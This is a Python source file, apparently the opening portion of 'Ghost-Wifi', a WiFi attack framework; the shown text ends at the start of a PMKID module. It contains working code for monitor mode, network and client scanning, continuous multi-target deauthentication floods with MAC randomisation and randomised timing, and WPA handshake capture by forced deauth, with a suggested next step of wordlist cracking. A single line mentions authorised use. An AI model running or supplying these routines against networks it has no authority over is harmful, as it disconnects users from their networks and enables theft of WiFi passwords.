#!/usr/bin/env python3
"""
Ghost-Wifi v3.0.0 - WiFi Attack & Audit Framework
By Gh0st-Bx1 | github.com/Ghost-Bx1
"""

import argparse
import http.server
import io
import json
import os
import random
import re
import shutil
import signal
import socket
import socketserver
import struct
import subprocess
import sys
import tempfile
import threading
import time
import urllib.parse
from datetime import datetime
from pathlib import Path

try:
    import colorama
    colorama.init(autoreset=True)
except ImportError:
    pass

R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
B = "\033[94m"; M = "\033[95m"; C = "\033[96m"
W = "\033[97m"; DIM = "\033[2m"; RST = "\033[0m"

VERSAO = "3.0.0"


def _build_banner():
    import re as _re
    Gc = "\033[92m"; Cy = "\033[96m"; D = "\033[2m"; N = "\033[1m"
    Wc = "\033[97m"; X = "\033[0m"
    IW = 68; eq = "═" * IW; sp = " " * IW
    TL = "╔"; TR = "╗"; BL = "╚"; BR = "╝"; VB = "║"
    hl = "─" * 44; bar = "│"
    vl = lambda s: len(_re.sub(r"\x1b\[[0-9;]*m", "", s))

    def _row(s):
        n = vl(s); p = max(0, IW - n); l = p // 2; r = p - l
        return f"{Gc}{VB}{X}{' ' * l}{s}{' ' * r}{Gc}{VB}{X}"

    def _row_l(s):
        n = vl(s); p = max(0, IW - n - 2)
        return f"{Gc}{VB}{X}  {s}{' ' * p}{Gc}{VB}{X}"

    ga = [
        ("", f"{Gc}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⠛⠛⠟⠟⠉⠛⣻⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{Gc}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⣀⣡⣤⣶⣶⣶⣶⣶⣶⣤⣀⡢⡝⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{Gc}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡡⣀⣴⡿⡛⡴⡿⣿⣿⣿⣿⣿⣿⣿⡿⣶⡑⠈⡛⠟⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{Gc}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⡜⣀⣾⣿⣤⣋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⣻⣶⣦⣤⣀⠉⠛⣿⣿⣿⡿⠟⡛⡛⣻⠟⣿⣿⣿⣿{X}", ""),
        ("", f"{Gc}⣿⠟⠟⠟⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⣀⣿⣿⣿⡿⠛⠛⣻⣿⣿⣿⡿⠛⠛⡿⣿⣿⣧⠉⠉⣁⣈⣉⣁⣀⣿⣿⡛⠄⣁⣴⣶⣄⠐⣌⣻⣿{X}", ""),
        ("", f"{Gc}⡏⠀⣴⣶⣄⡢⡙⡿⣿⣿⣿⣿⣿⣿⡇⠀⣼⣿⣿⣿⡅⠀⠀  ⡺⣿⡿⠁⠀⠀⠀⡺⣿⣿⡆⠀⣿⣿⣿⣿⣿⡏⠁⣀⣴⣿⣿⣿⣿⣷⡈⠎⡿{X}", ""),
        ("", f"{Gc}⡇⠀⣿⣿⣿⣷⣌⠀⠙⡿⣿⣿⣿⣿⠀⣀⣿⣿⣿⣿⠀⠀⠀  ⠀⠈⣿⡇⠀⠀⠀⠀⠈⡿⣿⡇⠁⣻⣿⣿⣿⡿⠁⣀⣾⣿⣿⣿⡿⡿⣿⣷⠀⠘⣿{X}", ""),
        ("", f"{Gc}⣇⠀⡿⣿⣿⡏⣿⣷⣄⠀⠙⡿⣿⡇⠀⣸⣿⣿⡿⣿⡀⠀⠀⠀  ⣸⣿⣧⠀⠀⠀⠀⣸⡈⣿⣷⠀⡈⣿⣿⡿⠁⣀⣾⣿⣿⣊⣿⠁⣾⣿⣿⡆⠀⡿{X}", ""),
        ("", f"{Gc}⣿⡀⠘⣿⣿⣿⡘⣿⣿⣷⣌⠂⠉⠁⣀⣿⣿⡏⣰⡿⣷⣤⣤⣴⣿⣿⣿⣷⣄⣀⣴⣿⣧⠘⣿⣧⣐⡢⠉⠁⣀⣾⣿⣿⡇⣼⣿⣸⣿⣿⣿⣇⠀⣸{X}", ""),
        ("", f"{Gc}⣿⣷⡀⠘⣿⣿⣧⠘⣿⣿⣿⣿⣶⣶⣿⣿⠏⡰⡛⣾⣿⣿⣿⣿⡏⠀⠈⣿⣿⣿⣿⣿⣏⡳⡘⣿⣿⣷⣶⣾⣿⣿⣿⣿⣀⣿⣿⣿⣿⣿⣿⣿⠀⣸{X}", ""),
        ("", f"{Gc}⣿⣿⡇⠀⣿⣿⣿⡄⡿⡿⣿⣿⣿⣿⣿⣷⣾⣷⣿⣿⣿⣿⣿⣿⣧⣀⣀⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠛⠋⠉⠉⠛⠟⠟⣿⠀⣸{X}", ""),
        ("", f"{Gc}⣿⣿⡇⣀⣿⣿⣿⣧⣸⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⣀⣾⣿⡄⠈⠀⠀⠀⠀ ⣾{X}", ""),
        ("", f"{Gc}⣿⡏⠀⣸⣿⣿⣿⣿⡜⡇⡿⣧⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡉⠛⠟⠀⡰⠀⠀ ⣀⣾{X}", ""),
    ]

    info = [
        f"{Gc}{N}GHOST-WIFI{X}",
        f"{Cy}v{VERSAO}  {D}WiFi Attack & Audit Framework{X}",
        f"{D}{hl}{X}",
        f"{Wc}By Gh0st-Bx1  {D}{bar}  github.com/Ghost-Bx1{X}",
        f"{D}{hl}{X}",
        f"{D}ifaces  monitor  scan  hop  deauth  capture  pmkid{X}",
        f"{D}wps  evil-twin  crack  wep  karma  auto  decloak{X}",
        f"{D}nic-detect  beacon-flood  probe-hunt  mdk4  portal{X}",
    ]

    out = [f"{Gc}{TL}{eq}{TR}{X}", f"{Gc}{VB}{sp}{VB}{X}"]
    for left, center, right in ga:
        combined = left + center + right
        out.append(_row(combined))
    out.append(f"{Gc}{VB}{sp}{VB}{X}")
    for i in info:
        out.append(_row_l(i))
    out += [f"{Gc}{VB}{sp}{VB}{X}", f"{Gc}{BL}{eq}{BR}{X}"]
    return "\n".join(out)


BANNER = _build_banner()

# ─── Helpers ──────────────────────────────────────────────────────────────────

def print_banner():
    print(BANNER)

def err(msg):
    print(f"{R}[!]{RST} {msg}")

def ok(msg):
    print(f"{G}[+]{RST} {msg}")

def info(msg):
    print(f"{C}[*]{RST} {msg}")

def warn(msg):
    print(f"{Y}[~]{RST} {msg}")

def run(cmd, capture=True, timeout=30):
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=capture,
            text=True, timeout=timeout
        )
        return r.stdout, r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        return "", "timeout", 1
    except Exception as e:
        return "", str(e), 1

def require_tool(*tools):
    missing = [t for t in tools if not shutil.which(t)]
    if missing:
        err(f"Required tools not found: {', '.join(missing)}")
        info("Install: sudo apt install aircrack-ng iw wireless-tools")
        sys.exit(1)

def require_root():
    if os.geteuid() != 0:
        err("This module requires root privileges.")
        sys.exit(1)

def get_interfaces():
    out, _, _ = run("iw dev 2>/dev/null")
    ifaces = re.findall(r"Interface (\S+)", out)
    if not ifaces:
        out2, _, _ = run("iwconfig 2>/dev/null")
        ifaces = re.findall(r"^(\S+)\s+IEEE", out2, re.MULTILINE)
    return ifaces

def get_monitor_interfaces():
    out, _, _ = run("iw dev 2>/dev/null")
    return re.findall(r"Interface (\S+)\n\s+type monitor", out)

def save_json(data, path):
    with open(path, "w") as f:
        json.dump(data, f, indent=2, default=str)
    ok(f"Results saved to {path}")

# ─── OUI / Chipset Database ───────────────────────────────────────────────────

_OUI_DB = {
    "00:C0:CA": "Alfa Network", "14:EB:B6": "Alfa Network",
    "F4:F2:6D": "Alfa Network", "00:03:7F": "Atheros Comm.",
    "04:DA:D2": "Atheros/Qualcomm", "60:D8:19": "Atheros/Qualcomm",
    "9C:EF:D5": "Atheros/Qualcomm", "D4:85:64": "Atheros/Qualcomm",
    "00:0C:E7": "Ralink Technology", "00:17:C5": "Ralink Technology",
    "00:90:4C": "Epigram/Broadcom", "00:17:F2": "Apple (Broadcom)",
    "00:10:18": "Broadcom", "20:47:DA": "Broadcom",
    "00:1A:73": "Broadcom", "04:F0:21": "Broadcom",
    "00:E0:4C": "Realtek Semicon.", "08:BE:AC": "Realtek Semicon.",
    "2C:4D:54": "Realtek Semicon.", "5C:EA:1D": "Realtek Semicon.",
    "00:11:22": "Realtek Semicon.", "0C:9D:92": "Realtek Semicon.",
    "D0:DF:9A": "MediaTek Inc.",  "58:00:E3": "MediaTek Inc.",
    "EC:08:6B": "TP-Link", "50:C7:BF": "TP-Link",
    "98:DA:C4": "TP-Link", "54:AF:97": "TP-Link",
    "C0:4A:00": "TP-Link", "F4:F2:6D": "TP-Link",
    "18:A6:F7": "TP-Link", "10:FE:ED": "TP-Link",
    "B0:BE:76": "TP-Link", "30:B5:C2": "TP-Link",
    "00:02:B3": "Intel Corp.",   "00:16:EB": "Intel Corp.",
    "A0:88:69": "Intel Corp.",   "60:F2:62": "Intel Corp.",
    "98:4F:EE": "Intel Corp.",   "8C:8D:28": "Intel Corp.",
    "FC:F8:AE": "Intel Corp.",   "00:1B:21": "Intel Corp.",
    "5C:E0:C5": "Intel Corp.",   "A4:C3:F0": "Intel Corp.",
    "88:08:DF": "Intel Corp.",   "1C:4D:70": "Intel Corp.",
    "8C:EC:4B": "Intel Corp.",   "24:FD:52": "Intel Corp.",
    "00:50:F1": "Cisco Systems",  "00:1A:A1": "Cisco Systems",
    "00:1C:0F": "Cisco Systems",  "58:BC:27": "Cisco Systems",
    "00:14:69": "Cisco/Linksys", "00:18:F8": "Cisco/Linksys",
    "00:1F:33": "Cisco/Linksys", "00:21:29": "Cisco/Linksys",
    "C8:D7:19": "Netgear",       "20:4E:7F": "Netgear",
    "84:1B:5E": "Netgear",       "10:0D:7F": "Netgear",
    "04:A1:51": "Netgear",       "9C:3D:CF": "Netgear",
    "00:26:F2": "Netgear",       "E0:91:F5": "Netgear",
    "2C:30:33": "Belkin",        "EC:1A:59": "Belkin",
    "94:44:52": "Belkin",        "00:30:BD": "Belkin",
    "00:17:3F": "ASUS",          "00:50:FC": "ASUS",
    "04:92:26": "ASUS",          "08:60:6E": "ASUS",
    "10:7B:44": "ASUS",          "14:DA:E9": "ASUS",
    "1C:87:2C": "ASUS",          "2C:AB:25": "ASUS",
    "5C:FF:35": "ASUS",          "74:D0:2B": "ASUS",
    "00:03:93": "Apple Inc.",    "00:0D:93": "Apple Inc.",
    "00:11:24": "Apple Inc.",    "00:14:51": "Apple Inc.",
    "04:54:53": "Apple Inc.",    "14:5A:05": "Apple Inc.",
    "18:9E:FC": "Apple Inc.",    "20:C9:D0": "Apple Inc.",
    "3C:07:54": "Apple Inc.",    "78:31:C1": "Apple Inc.",
    "78:4F:43": "Apple Inc.",    "90:84:0D": "Apple Inc.",
    "A4:5E:60": "Apple Inc.",    "D4:9A:20": "Apple Inc.",
    "F0:D1:A9": "Apple Inc.",    "F0:F6:1C": "Apple Inc.",
    "00:1A:11": "Google Inc.",   "54:60:09": "Google Inc.",
    "F4:F5:DB": "Google Inc.",   "94:EB:2C": "Google Inc.",
    "00:16:3E": "Samsung Elec.", "00:17:C9": "Samsung Elec.",
    "30:19:66": "Samsung Elec.", "50:01:BB": "Samsung Elec.",
    "78:1F:DB": "Samsung Elec.", "84:38:38": "Samsung Elec.",
    "78:4B:87": "Samsung Elec.", "CC:3A:61": "Samsung Elec.",
    "00:50:56": "VMware Inc.",   "00:0C:29": "VMware Inc.",
    "08:00:27": "VirtualBox",    "52:54:00": "QEMU/KVM",
    "00:1A:4A": "Ubiquiti Netw.","00:27:22": "Ubiquiti Netw.",
    "04:18:D6": "Ubiquiti Netw.","24:A4:3C": "Ubiquiti Netw.",
    "44:D9:E7": "Ubiquiti Netw.","68:72:51": "Ubiquiti Netw.",
    "78:8A:20": "Ubiquiti Netw.","AC:8B:A9": "Ubiquiti Netw.",
    "DC:9F:DB": "Ubiquiti Netw.","F0:9F:C2": "Ubiquiti Netw.",
}

_DRIVER_CHIPSET = {
    "rtl8812au": "Realtek RTL8812AU (AC1200 2.4/5GHz)",
    "rtl8812bu": "Realtek RTL8812BU (AC1200 2.4/5GHz)",
    "rtl8814au": "Realtek RTL8814AU (AC1900 2.4/5GHz)",
    "rtl8821cu": "Realtek RTL8821CU (AC600 2.4/5GHz)",
    "rtl8821au": "Realtek RTL8821AU (AC600 2.4/5GHz)",
    "rtl8192cu": "Realtek RTL8192CU (N300 2.4GHz)",
    "rtl8188eu": "Realtek RTL8188EU (N150 2.4GHz)",
    "rtl8188cus": "Realtek RTL8188CUS (N150 2.4GHz)",
    "rtl8192eu": "Realtek RTL8192EU (N300 2.4GHz)",
    "rtl88x2bu": "Realtek RTL88x2BU (AC1300 2.4/5GHz)",
    "mt7612u":  "MediaTek MT7612U (AC1200 2.4/5GHz)",
    "mt7610u":  "MediaTek MT7610U (AC580 5GHz)",
    "mt7921u":  "MediaTek MT7921U (AX1800 WiFi6 2.4/5GHz)",
    "mt76x2u":  "MediaTek MT76x2U (AC1200 2.4/5GHz)",
    "ath9k_htc":"Atheros AR9271/AR7010 (N150 2.4GHz)",
    "ath9k":    "Atheros 802.11n (N series)",
    "ath10k_pci":"Qualcomm Atheros 802.11ac",
    "ath10k_sdio":"Qualcomm Atheros 802.11ac SDIO",
    "ath11k":   "Qualcomm Atheros 802.11ax WiFi6",
    "iwlwifi":  "Intel Wireless (depends on firmware)",
    "iwlegacy": "Intel Wireless Legacy",
    "brcmfmac": "Broadcom FullMAC WiFi",
    "brcmsmac": "Broadcom SoftMAC WiFi",
    "b43":      "Broadcom b43 (legacy 802.11b/g)",
    "wl":       "Broadcom proprietary STA",
    "carl9170": "Atheros AR9170 (N150 USB)",
    "rt2800usb":"Ralink RT2870/RT3070 (N150 USB)",
    "rt2800pci":"Ralink RT2800 PCI",
    "rt73usb":  "Ralink RT73 USB",
    "rtl8xxxu": "Realtek 802.11n USB generic",
    "p54usb":   "Prism54 USB",
    "zd1211rw": "ZyDAS ZD1211 USB",
    "orinoco":  "Lucent/Agere Orinoco",
    "ipw2100":  "Intel PRO/Wireless 2100",
    "ipw2200":  "Intel PRO/Wireless 2200",
    "mwifiex":  "Marvell WiFi (mwifiex)",
    "wilc1000": "Microchip WILC1000",
    "wfx":      "Silicon Laboratories WFx200",
}

def _oui_vendor(mac):
    if not mac or len(mac) < 8:
        return "Unknown"
    oui = mac.upper()[:8]
    return _OUI_DB.get(oui, "Unknown")

def _injection_test(iface):
    """Test injection capability via aireplay-ng --test."""
    if not shutil.which("aireplay-ng"):
        return None, "aireplay-ng not found"
    out, err_s, rc = run(f"aireplay-ng --test {iface} 2>&1", timeout=20)
    combined = (out + err_s).lower()
    if "injection is working" in combined or "injected" in combined:
        pkt = re.search(r"(\d+)\s+(?:packet|frame)", combined)
        return True, pkt.group(1) + " pkts" if pkt else "OK"
    elif "no ap" in combined or "0 injection" in combined or "not working" in combined:
        return False, "injection failed"
    elif "monitor mode" in combined:
        return False, "not in monitor mode"
    return None, "result inconclusive"

def _band_support(iface):
    """Return (supports_2ghz, supports_5ghz, supports_6ghz) via iw phy."""
    out, _, _ = run(f"iw phy 2>/dev/null")
    if not out:
        out, _, _ = run(f"iw dev {iface} info 2>/dev/null")
    freqs = re.findall(r"\*\s+(\d+)\s+MHz", out)
    bands = {int(f) // 1000 for f in freqs if f.isdigit()}
    hz2 = any(2 <= b <= 2 for b in bands) or any(2412 <= int(f) <= 2484 for f in freqs if f.isdigit())
    hz5 = any(5 <= b <= 5 for b in bands) or any(5180 <= int(f) <= 5900 for f in freqs if f.isdigit())
    hz6 = any(5945 <= int(f) <= 7125 for f in freqs if f.isdigit())
    return hz2, hz5, hz6

def _phy_name(iface):
    """Return phy name for the interface."""
    out, _, _ = run(f"iw dev {iface} info 2>/dev/null")
    m = re.search(r"wiphy\s+(\d+)", out)
    if m:
        return f"phy{m.group(1)}"
    return None

def _tx_power(iface):
    """Return current TX power in dBm."""
    out, _, _ = run(f"iw dev {iface} info 2>/dev/null")
    m = re.search(r"txpower\s+([\d.]+)\s+dBm", out)
    return m.group(1) if m else None

def _monitor_capable(iface):
    """Check if interface supports monitor mode via iw phy capabilities."""
    phy = _phy_name(iface)
    if not phy:
        return None
    out, _, _ = run(f"iw phy {phy} info 2>/dev/null")
    return "monitor" in out.lower()

def _get_driver(iface):
    """Get driver name via ethtool -i or /sys."""
    out, _, _ = run(f"ethtool -i {iface} 2>/dev/null")
    m = re.search(r"driver:\s*(\S+)", out)
    if m:
        return m.group(1)
    sys_path = f"/sys/class/net/{iface}/device/driver"
    if os.path.islink(sys_path):
        return os.path.basename(os.readlink(sys_path))
    return None

def _bus_type(iface):
    """Detect if interface is USB or PCI."""
    dev_path = f"/sys/class/net/{iface}/device"
    if not os.path.exists(dev_path):
        return "unknown"
    real = os.path.realpath(dev_path)
    if "/usb" in real:
        return "USB"
    if "/pci" in real:
        return "PCI"
    return "other"

def _usb_device_info(iface):
    """Return USB vendor/product string if interface is USB-based."""
    dev_path = f"/sys/class/net/{iface}/device"
    if not os.path.exists(dev_path):
        return None
    real = os.path.realpath(dev_path)
    # Navigate up to USB device level
    parts = real.split("/")
    for i in range(len(parts), 0, -1):
        path = "/".join(parts[:i])
        vid_f = os.path.join(path, "idVendor")
        pid_f = os.path.join(path, "idProduct")
        prod_f = os.path.join(path, "product")
        if os.path.exists(vid_f) and os.path.exists(pid_f):
            try:
                vid = open(vid_f).read().strip()
                pid = open(pid_f).read().strip()
                prod = open(prod_f).read().strip() if os.path.exists(prod_f) else ""
                return f"{vid}:{pid} {prod}".strip()
            except:
                pass
    return None

# ─── Module: interfaces ───────────────────────────────────────────────────────

def cmd_ifaces(args):
    if not args.no_banner:
        print_banner()
    ifaces = get_interfaces()
    if not ifaces:
        warn("No wireless interfaces found.")
        return
    print(f"\n{W}{'Interface':<12} {'Mode':<12} {'Driver':<20} {'MAC':<19} {'Vendor'}{RST}")
    print("-" * 80)
    results = []
    for iface in ifaces:
        out, _, _ = run(f"iw dev {iface} info 2>/dev/null")
        mode = re.search(r"type (\S+)", out)
        mode = mode.group(1) if mode else "unknown"
        mac = re.search(r"addr ([\da-f:]+)", out)
        mac = mac.group(1) if mac else "unknown"
        drv = _get_driver(iface) or "unknown"
        vendor = _oui_vendor(mac)
        print(f"  {iface:<12} {mode:<12} {drv:<20} {mac:<19} {DIM}{vendor}{RST}")
        results.append({"interface": iface, "mode": mode, "driver": drv, "mac": mac, "vendor": vendor})
    print(f"\n{DIM}Tip: use 'nic-detect' for full capability analysis (injection, bands, TX power){RST}\n")
    if args.output:
        save_json({"interfaces": results}, args.output)

# ─── Module: monitor ──────────────────────────────────────────────────────────

def cmd_monitor(args):
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("airmon-ng")
    iface = args.interface

    if args.action == "start":
        info(f"Starting monitor mode on {iface}...")
        run("airmon-ng check kill", capture=False)
        out, err_s, rc = run(f"airmon-ng start {iface}")
        mon = re.search(r"monitor mode (?:enabled|vif) (?:on|added) for \[?\S+\]?; ?\(?\S*\)?(\w+mon\d*|\w+mon)", out)
        if not mon:
            mon = re.search(r"(\w+mon\d*)", out)
        mon_iface = mon.group(1) if mon else f"{iface}mon"
        ok(f"Monitor interface: {mon_iface}")
        if args.channel:
            run(f"iwconfig {mon_iface} channel {args.channel}")
            ok(f"Set channel {args.channel}")

    elif args.action == "stop":
        info(f"Stopping monitor mode on {iface}...")
        run(f"airmon-ng stop {iface}")
        run("service NetworkManager start 2>/dev/null || systemctl start NetworkManager 2>/dev/null")
        ok("Monitor mode stopped, networking restored.")

    elif args.action == "check":
        out, _, _ = run(f"iw dev {iface} info")
        mode = re.search(r"type (\S+)", out)
        if mode:
            info(f"{iface} is in {mode.group(1)} mode")
        else:
            warn(f"Could not determine mode for {iface}")

# ─── Module: scan ─────────────────────────────────────────────────────────────

def cmd_scan(args):
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("airodump-ng")
    mon = args.interface
    if not mon:
        mons = get_monitor_interfaces()
        if not mons:
            err("No monitor interface found. Run: ghost-wifi.py monitor --interface wlan0 --action start")
            sys.exit(1)
        mon = mons[0]
        info(f"Using monitor interface: {mon}")

    duration = args.duration or 30
    out_prefix = tempfile.mktemp(prefix="/tmp/ghostwifi_scan_")

    info(f"Scanning for {duration}s on {mon}...")
    band = f"--band {args.band}" if args.band else ""
    ch = f"--channel {args.channel}" if args.channel else ""

    proc = subprocess.Popen(
        f"airodump-ng {mon} {band} {ch} --write {out_prefix} --output-format csv -a",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    try:
        time.sleep(duration)
    finally:
        proc.terminate()
        proc.wait()

    csv_file = f"{out_prefix}-01.csv"
    if not os.path.exists(csv_file):
        err(f"No scan output at {csv_file}")
        return

    aps, clients = _parse_airodump_csv(csv_file)
    _print_scan_results(aps, clients, args.verbose)

    result = {"aps": aps, "clients": clients, "scan_time": datetime.now().isoformat()}
    if args.output:
        save_json(result, args.output)

    # cleanup tmp
    for f in Path("/tmp").glob("ghostwifi_scan_*"):
        f.unlink(missing_ok=True)

def _parse_airodump_csv(csv_file):
    aps, clients = [], []
    section = "ap"
    with open(csv_file, errors="replace") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            if "Station MAC" in line:
                section = "client"
                continue
            if section == "ap" and "," in line and not line.startswith("BSSID"):
                p = [x.strip() for x in line.split(",")]
                if len(p) >= 14 and re.match(r"[0-9A-Fa-f:]{17}", p[0]):
                    aps.append({
                        "bssid": p[0], "first_seen": p[1], "last_seen": p[2],
                        "channel": p[3], "speed": p[4], "privacy": p[5],
                        "cipher": p[6], "auth": p[7], "power": p[8],
                        "beacons": p[9], "iv": p[10], "lan_ip": p[11],
                        "id_length": p[12], "essid": p[13].strip('"'),
                        "key": p[14] if len(p) > 14 else ""
                    })
            elif section == "client" and "," in line and not line.startswith("Station"):
                p = [x.strip() for x in line.split(",")]
                if len(p) >= 6 and re.match(r"[0-9A-Fa-f:]{17}", p[0]):
                    clients.append({
                        "mac": p[0], "first_seen": p[1], "last_seen": p[2],
                        "power": p[3], "packets": p[4],
                        "bssid": p[5], "probed_essids": ",".join(p[6:]).strip()
                    })
    return aps, clients

def _signal_bar(pwr_str, width=10):
    """Return a colored signal strength bar from dBm string."""
    try:
        val = int(pwr_str)
    except (ValueError, TypeError):
        return " " * width
    # -30 = excellent, -67 = good, -80 = fair, -90 = poor
    pct = max(0.0, min(1.0, (val + 100) / 70.0))
    filled = int(pct * width)
    if pct > 0.65:
        col = G
    elif pct > 0.35:
        col = Y
    else:
        col = R
    return f"{col}{'|' * filled}{DIM}{'.' * (width - filled)}{RST}"

def _print_scan_results(aps, clients, verbose=False):
    print(f"\n{W}{'BSSID':<19} {'CH':<4} {'SIG':<13} {'ENC':<14} {'VENDOR':<16} {'ESSID'}{RST}")
    print("-" * 100)
    sorted_aps = sorted(aps, key=lambda x: int(x["power"]) if x["power"].lstrip("-").isdigit() else -100, reverse=True)
    for ap in sorted_aps:
        enc = ap["privacy"]
        if "WEP" in enc:
            color = R
        elif "SAE" in enc or "WPA3" in enc.upper():
            color = M
        elif "OPN" in enc or enc.strip() == "":
            color = R
        elif "WPS" in enc:
            color = Y
        else:
            color = G
        enc_tag = enc + (" [WPA3]" if "SAE" in enc else "") + (" [OPN]" if enc.strip() == "" else "")
        hidden = f"{DIM}[hidden]{RST}" if not ap["essid"] else ap["essid"]
        bar = _signal_bar(ap["power"])
        vendor = _oui_vendor(ap["bssid"])[:15]
        pwr_str = f"{ap['power']:>4}dBm" if ap["power"].lstrip("-").isdigit() else f"{ap['power']:>7}"
        print(f"  {ap['bssid']:<19} {ap['channel']:<4} {bar} {pwr_str:<6} {color}{enc_tag:<14}{RST} {DIM}{vendor:<16}{RST} {hidden}")

    if clients:
        print(f"\n{W}{'CLIENT MAC':<19} {'PWR':<5} {'VENDOR':<18} {'ASSOC BSSID':<19} PROBED ESSIDs{RST}")
        print("-" * 90)
        for c in clients:
            vendor = _oui_vendor(c["mac"])[:17]
            print(f"  {c['mac']:<19} {c['power']:<5} {DIM}{vendor:<18}{RST} {c['bssid']:<19} {c['probed_essids']}")

    ok(f"Found {len(aps)} APs ({sum(1 for a in aps if not a.get('essid'))} hidden), {len(clients)} clients")

# ─── Module: hop (channel hopping) ────────────────────────────────────────────

def cmd_hop(args):
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("iwconfig")
    iface = args.interface
    channels = list(range(1, 15)) if not args.channels else [int(c) for c in args.channels.split(",")]
    delay = args.delay or 0.5
    info(f"Hopping channels {channels} on {iface} every {delay}s. Ctrl+C to stop.")
    try:
        while True:
            for ch in channels:
                run(f"iwconfig {iface} channel {ch}")
                if args.verbose:
                    info(f"Channel {ch}")
                time.sleep(delay)
    except KeyboardInterrupt:
        ok("Channel hopping stopped.")

# ─── Module: deauth ───────────────────────────────────────────────────────────

def cmd_deauth(args):
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("aireplay-ng")
    mon = args.interface
    if getattr(args, "mac_rand", False):
        mac_randomize(mon)

    # Build target list (supports --bssid-list for multi-target)
    bssid_list_str = getattr(args, "bssid_list", None)
    if bssid_list_str:
        targets = [b.strip() for b in bssid_list_str.split(",") if b.strip()]
    elif args.bssid:
        targets = [args.bssid]
    else:
        err("Provide --bssid or --bssid-list"); return

    client = args.client or "FF:FF:FF:FF:FF:FF"
    count  = args.count or 0
    rand_interval = getattr(args, "rand_interval", False)
    min_i  = getattr(args, "interval_min", 1)
    max_i  = getattr(args, "interval_max", 5)

    warn("Use only on networks you own or have authorization to test.")
    if args.channel:
        run(f"iwconfig {mon} channel {args.channel}")

    info(f"Targets: {len(targets)} BSSID(s), client: {client}, count: {count or 'continuous'}"
         + (f", rand-interval [{min_i}-{max_i}s]" if rand_interval else ""))

    def _deauth_one(bssid, rounds):
        cmd_str = f"aireplay-ng --deauth {rounds} -a {bssid} -c {client} {mon}"
        if rounds == 0:
            subprocess.run(cmd_str, shell=True)
        else:
            run(cmd_str, timeout=max(60, rounds * 2))
            ok(f"Sent {rounds} deauth frames -> {bssid}")

    if len(targets) == 1 and count == 0:
        info("Press Ctrl+C to stop...")
        try:
            _deauth_one(targets[0], 0)
        except KeyboardInterrupt:
            ok("Deauth stopped.")
        return

    # Multi-target rotation loop
    try:
        rounds_done = 0
        burst = count if count > 0 else 10
        while count == 0 or rounds_done < count:
            for bssid in targets:
                _deauth_one(bssid, burst)
                if rand_interval:
                    delay = random.uniform(min_i, max_i)
                    time.sleep(delay)
                else:
                    time.sleep(1)
            rounds_done += burst
            if count > 0 and rounds_done >= count:
                break
        ok("Deauth complete.")
    except KeyboardInterrupt:
        ok("Deauth stopped.")

# ─── Module: capture (WPA handshake) ──────────────────────────────────────────

def cmd_capture(args):
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("airodump-ng", "aireplay-ng")
    mon = args.interface
    if getattr(args, "mac_rand", False):
        mac_randomize(mon)
    bssid = args.bssid
    essid = args.essid or bssid
    channel = args.channel
    out_prefix = args.output or f"capture_{bssid.replace(':','')}"

    if channel:
        run(f"iwconfig {mon} channel {channel}")
        ok(f"Set channel {channel}")

    info(f"Capturing handshake from {essid} ({bssid}) on channel {channel or 'auto'}...")
    info(f"Output prefix: {out_prefix}")

    proc = subprocess.Popen(
        f"airodump-ng -c {channel or 1} --bssid {bssid} -w {out_prefix} {mon}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    handshake_found = False
    start = time.time()
    timeout = args.timeout or 120

    # Send deauth bursts to trigger handshake
    if not args.passive:
        info("Sending deauth frames to trigger handshake...")
        for i in range(5):
            if time.time() - start > timeout:
                break
            run(f"aireplay-ng --deauth 5 -a {bssid} {mon}", timeout=10)
            time.sleep(3)
            # Check for handshake in cap file
            cap_file = f"{out_prefix}-01.cap"
            if os.path.exists(cap_file):
                out, _, _ = run(f"aircrack-ng {cap_file} 2>&1 | grep 'handshake'")
                if "handshake" in out.lower():
                    handshake_found = True
                    ok(f"Handshake captured in {cap_file}")
                    break
            if handshake_found:
                break
    else:
        info(f"Passive mode - waiting {timeout}s for handshake...")
        time.sleep(timeout)
        cap_file = f"{out_prefix}-01.cap"
        if os.path.exists(cap_file):
            out, _, _ = run(f"aircrack-ng {cap_file} 2>&1")
            if "handshake" in out.lower():
                handshake_found = True

    proc.terminate()
    proc.wait()

    cap_file = f"{out_prefix}-01.cap"
    if handshake_found:
        ok(f"Handshake saved: {cap_file}")
        ok(f"Crack with: ghost-wifi.py crack --cap {cap_file} --wordlist rockyou.txt")
    else:
        warn(f"Handshake not confirmed. Check {cap_file} manually.")
        info(f"Manual check: aircrack-ng {cap_file}")

# ─── Module: pmkid ────────────────────────────────────────────────────────────

def cmd_pmkid(args):
    if not args.no_banner:
        print_banner()
